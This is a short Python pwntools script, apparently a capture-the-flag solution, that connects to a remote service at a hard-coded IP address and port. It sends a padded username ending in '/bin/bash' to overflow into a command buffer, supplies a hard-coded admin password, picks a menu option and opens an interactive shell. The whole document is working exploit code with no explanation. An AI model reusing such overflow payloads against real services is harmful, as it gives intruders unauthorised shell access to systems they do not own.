from pwn import * 

io = remote('62.173.140.174', 17500)

user = b'Olegaaaabbbbccccddddeeeeffffggls/bin/bash'
passw = 'Super_Oleg_admin'

io.sendlineafter(b'Enter a name: ', user)
io.sendlineafter(b'Enter a password: ', passw)

io.recvuntil(b'Select item (1-3): ')
io.sendline(b'2')
io.interactive()
print(io.recvline())